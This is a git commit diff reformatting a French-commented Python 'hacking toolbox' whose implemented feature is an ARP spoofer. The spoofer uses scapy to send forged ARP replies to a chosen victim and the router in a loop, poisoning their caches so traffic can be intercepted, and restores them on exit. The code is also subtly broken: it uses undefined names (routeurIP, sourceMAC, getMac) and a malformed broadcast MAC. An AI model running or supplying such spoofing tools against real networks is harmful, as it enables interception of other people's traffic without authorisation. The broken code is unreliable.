f137001bc6fd38c1fce4bbeb83accc0bef4b0e08
ceZarMax <129675097+ceZarMax@users.noreply.github.com>
2023-12-26 22:19:19 +0100

    Update NEW CODE TEST.py

--- NEW CODE TEST.py
+++ NEW CODE TEST.py
@@ -17,7 +17,6 @@ import sys # on importe la librairie sys pour permettre des impressions dynamiqu
 
 #---------------------------------------------------------
 
-
 print("""  _____                           __  __                      _   _           
   / ____|                         |  \/  |                    | | (_)           
  | |     __ _  ___  ___  __ _ _ __| \  / | __ ___  _____ _ __ | |_ _ _   _ ___  
@@ -26,34 +25,35 @@ print("""  _____                           __  __                      _   _
   \_____\__,_|\___||___/\__,_|_|  |_|  |_|\__,_/_/\_\___|_| |_|\__|_|\__,_|___/ 
                                                                                 \n
                                                                                 \n """)
+
 # Création de ma fonction main étant le principal menu de ma boîte à outil
 def main():
-	while True : # Boucle pour revenir aux demandes au cas ou l'utilisateur n'intérargi pas avec une fonction
-		n = input("1- Network Scanner\n2- ARP Spoofing\n3- Exploit\n\nEntrez un nombre : ") # Création des choix du menu
-		if n == '1': # boucle qui renvoie à un print si l'utilisateur choisi 1
-			print("***********************************************************************") 
-			print("En cours de construction")
-			print("***********************************************************************") 
-		elif n == '2': # boucle qui va renvoyer l'utilisateur à la fonction si il choisit 2
-			arpspoof()
-		elif n == '3':# boucle qui renvoie à un print si l'utilisateur choisi 3
-			print("***********************************************************************") 
-			print("En cours de construction")
-			print("***********************************************************************") 
-            
-		else: # boucle qui renvoie à un print si l'utilisateur choisi un nombre inexistant du menu
-			print("***********************************************************************") 
-			print("Cette option est inexistante")
-			print("***********************************************************************") 
+    while True:  # Boucle pour revenir aux demandes au cas où l'utilisateur n'interagit pas avec une fonction
+        n = input("1- Network Scanner\n2- ARP Spoofing\n3- Exploit\n\nEntrez un nombre : ")  # Création des choix du menu
+        if n == '1':  # boucle qui renvoie à un print si l'utilisateur choisit 1
+            print("***********************************************************************")
+            print("En cours de construction")
+            print("***********************************************************************")
+        elif n == '2':  # boucle qui va renvoyer l'utilisateur à la fonction s'il choisit 2
+            arpspoof()
+        elif n == '3':  # boucle qui renvoie à un print si l'utilisateur choisit 3
+            print("***********************************************************************")
+            print("En cours de construction")
+            print("***********************************************************************")
+
+        else:  # boucle qui renvoie à un print si l'utilisateur choisit un nombre inexistant du menu
+            print("***********************************************************************")
+            print("Cette option est inexistante")
+            print("***********************************************************************")
 
 
 # Fonction principale permettant de faire fonctionner tout le programme
-def arpspoof():    
+def arpspoof():
     # Message de bienvenue
-    print("***********************************************************************")  
+    print("***********************************************************************")
     print("**********Bienvenue sur le ARP Spoofer de CaesarMaxentius**********")
-    print("***********************************************************************")   
-    
+    print("***********************************************************************")
+
     # Définition de mes fonctions dynamiques permettant à l'utilisateur d'entrer lui-même ses caractères
     targetIP = input("Entrez l'adresse IP de la victime : ")
     spoofIP = input("Entrez l'adresse IP que vous voulez usurper : ")
@@ -65,8 +65,8 @@ def arpspoof():
 
     # Fonction pour rechercher la MAC
     def recherche_mac(targetIP, interface):
-        pkt7 = scapy.Ether(dst="ff:ff:ff:ff:ff") / scapy.ARP(pdst=targetIP) 
-        ans = scapy.srp1(pkt7, iface=interface, timeout=2)
+        pkt7 = Ether(dst="ff:ff:ff:ff:ff") / ARP(pdst=targetIP)
+        ans = srp1(pkt7, iface=interface, timeout=2)
         if ans:
             mac = ans[0][1].hwsrc
             return str(mac)
@@ -75,67 +75,55 @@ def arpspoof():
 
     # Utilisation de la fonction recherche_mac avec les arguments nécessaires
     destinationMac = recherche_mac(targetIP, interface)
-# -----------------
 
-# Message de lancement
+    # Message de lancement
+    print(
+        "##::::::::::'###::::'##::: ##::'######::'########:'##::::'##:'########:'##::: ##:'########::::\n"
+        "##:::::::::'## ##::: ###:: ##:'##... ##: ##.....:: ###::'###: ##.....:: ###:: ##:... ##..:::::\n"
+        "##::::::::'##:. ##:: ####: ##: ##:::..:: ##::::::: ####'####: ##::::::: ####: ##:::: ##:::::::\n"
+        "##:::::::'##:::. ##: ## ## ##: ##::::::: ######::: ## ### ##: ######::: ## ## ##:::: ##:::::::\n"
+        "##::::::: #########: ##. ####: ##::::::: ##...:::: ##. #: ##: ##...:::: ##. ####:::: ##:::::::\n"
+        "##::::::: ##.... ##: ##:. ###: ##::: ##: ##::::::: ##:.:: ##: ##::::::: ##:. ###:::: ##:::::::\n"
+        "########: ##:::: ##: ##::. ##:. ######:: ########: ##:::: ##: ########: ##::. ##:::: ##:::::::\n"
+        "........::..:::::..::..::::..:::......:::........::..:::::..::........::..::::..:::::..:::::::\n"
+    )
 
-# -----------------
+    def spoofer(targetIP, spoofIP):
+        packet = ARP(op=2, pdst=targetIP, hwdst=destinationMac, psrc=spoofIP)
+        send(packet, verbose=False)
 
-	print(
-	"##::::::::::'###::::'##::: ##::'######::'########:'##::::'##:'########:'##::: ##:'########::::\n"
-	"##:::::::::'## ##::: ###:: ##:'##... ##: ##.....:: ###::'###: ##.....:: ###:: ##:... ##..:::::\n"
-	"##::::::::'##:. ##:: ####: ##: ##:::..:: ##::::::: ####'####: ##::::::: ####: ##:::: ##:::::::\n"
-	"##:::::::'##:::. ##: ## ## ##: ##::::::: ######::: ## ### ##: ######::: ## ## ##:::: ##:::::::\n"
-	"##::::::: #########: ##. ####: ##::::::: ##...:::: ##. #: ##: ##...:::: ##. ####:::: ##:::::::\n"
-	"##::::::: ##.... ##: ##:. ###: ##::: ##: ##::::::: ##:.:: ##: ##::::::: ##:. ###:::: ##:::::::\n"
-	"########: ##:::: ##: ##::. ##:. ######:: ########: ##:::: ##: ########: ##::. ##:::: ##:::::::\n"
-	"........::..:::::..::..::::..:::......:::........::..:::::..::........::..::::..:::::..:::::::\n"
-	)
+    def restore(destinationIP, sourceIP):
+        packet = ARP(op=2, pdst=destinationIP, hwdst=getMac(destinationIP), psrc=sourceIP, hwsrc=sourceMAC)
+        send(packet, count=4, verbose=False)
+
+    packets = 0
+    try:
+        while True:
+            spoofer(targetIP, routeurIP)
+            spoofer(routeurIP, targetIP)
+            print("\rCaesar HACKING : [+] Envoie de paquets " + str(packets)),
+            sys.stdout.flush()
+            packets += 2
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("***********************************************************************")
+        print("\nInterrompre le Spoof en faisant CTRL + C------------ Retour à l'état normal..")
+        print("***********************************************************************")
+        print(
+            "\n   _____    ___.   .__               __          __   "
+            "\n  /  _  \   \_ |__ |__| ____   _____/  |_  _____/  |_ "
+            "\n /  /_\  \   | __ \|  |/ __ \ /    \   __\/  _ \   __\""
+            "\n/    |    \  | \_\ \  \  ___/|   |  \  | (  <_> )  |  "
+            "\n\____|__  /  |___  /__|\___  >___|  /__|  \____/|__|  "
+            "\n        \/       \/        \/     \/                  "
+        )
+        print("***********************************************************************")
+        restore(targetIP, routeurIP)
+        restore(routeurIP, targetIP)
 
 
-
-	def spoofer(targetIP, spoofIP):
-		packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
-		scapy.send(packet, verbose=False)
-
-	def restore(destinationIP, sourceIP):
-		packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=getMac(destinationIP),psrc=sourceIP,hwsrc=sourceMAC)
-		scapy.send(packet, count=4,verbose=False)
-
-
-	packets = 0
-	try:
-		while True:
-			spoofer(targetIP,routeurIP)
-			spoofer(routeurIP,targetIP)
-			print("\rCaesar HACKING : [+] Envoie de paquets "+ str(packets)),
-			sys.stdout.flush()
-			packets +=2
-			time.sleep(2)
-	except KeyboardInterrupt:
-		print("***********************************************************************")  
-		print("\nInterrompre le Spoof en faisant CTRL + C------------ Retour à l'état normal..")
-		print("***********************************************************************") 
-		print( 
-"\n   _____    ___.   .__               __          __   "
-"\n  /  _  \   \_ |__ |__| ____   _____/  |_  _____/  |_ "
-"\n /  /_\  \   | __ \|  |/ __ \ /    \   __\/  _ \   __\""
-"\n/    |    \  | \_\ \  \  ___/|   |  \  | (  <_> )  |  "
-"\n\____|__  /  |___  /__|\___  >___|  /__|  \____/|__|  "
-"\n        \/       \/        \/     \/                  "
-)
-		print("***********************************************************************") 
-		restore(targetIP,routeurIP)
-		restore(routeurIP,targetIP)
-        
-        
 if __name__ == "__main__":
-	main()        
-        
-        
-
-
-
+    main()
 
 
 
